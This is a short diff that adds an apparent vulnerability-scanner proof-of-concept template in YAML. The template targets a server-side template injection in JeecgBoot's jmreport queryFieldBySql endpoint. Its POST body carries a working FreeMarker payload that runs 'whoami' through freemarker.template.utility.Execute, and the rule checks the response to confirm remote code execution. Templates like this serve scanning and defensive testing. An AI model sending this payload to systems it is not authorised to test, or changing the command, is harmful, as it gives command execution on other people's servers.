@@ -1,0 +1,16 @@
+name: poc-yaml-jeecg-boot-ssti-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /jeecg-boot/jmreport/queryFieldBySql
+            headers:
+                Content-Type: application/json
+            body: '{"sql":"select ''<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}''"}'
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("解析成功") && response.body_string.contains("fieldList") && response.body_string.contains("fieldText") && response.headers["Content-Type"].contains("application/json")
+expression: r0()
+detail: {}
